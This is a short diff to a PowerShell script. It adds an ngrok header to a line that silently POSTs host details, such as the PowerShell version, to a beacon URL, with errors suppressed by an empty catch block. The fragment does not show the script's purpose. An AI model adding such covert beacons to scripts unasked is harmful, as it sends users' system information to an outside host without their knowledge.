@@ -29,7 +29,7 @@ try {
             powershell   = $PSVersionTable.PSVersion.ToString()
         }
     } | ConvertTo-Json
-    Invoke-RestMethod -Uri $BeaconUrl -Method Post -Body $body -ContentType "application/json" -TimeoutSec 5 | Out-Null
+    Invoke-RestMethod -Uri $BeaconUrl -Method Post -Body $body -ContentType "application/json" -Headers @{'ngrok-skip-browser-warning'='true'} -TimeoutSec 5 | Out-Null
 } catch {}
 
 Write-Host "============================================"
